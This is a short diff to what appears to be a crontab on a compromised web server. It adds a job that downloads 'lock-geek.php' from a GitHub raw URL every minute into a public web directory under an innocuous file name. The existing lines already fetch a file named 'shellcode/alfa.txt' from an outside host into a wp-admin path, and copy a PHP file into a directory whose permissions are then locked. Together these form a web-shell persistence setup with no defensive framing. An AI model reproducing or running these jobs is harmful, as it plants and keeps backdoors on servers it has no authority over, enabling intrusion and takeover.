@@ -4,6 +4,7 @@
 * * * * * mkdir -p /home/nexos/buku-mimpi;cp -r /home/vulnerabilidadycambio/wp-content/uploads/2022/05/index.php /home/nexos/buku-mimpi/index.php;chmod 0555 /home/nexos/buku-mimpi;chmod 0444 /home/nexos/buku-mimpi/index.php;chmod 0555 /home/nexos >/dev/null 2>&1
 
 * * * * * wget -q https://timseosukses.com/shellcode/alfa.txt -O /var/www/html/wpweb/pgpaud/wp-admin/includes/index.php
+* * * * * wget https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/lock-geek.php -O /var/www/html/silkalibrasi/2024/public/file/draft-sertifikat/get_halaman.php
 
 
 
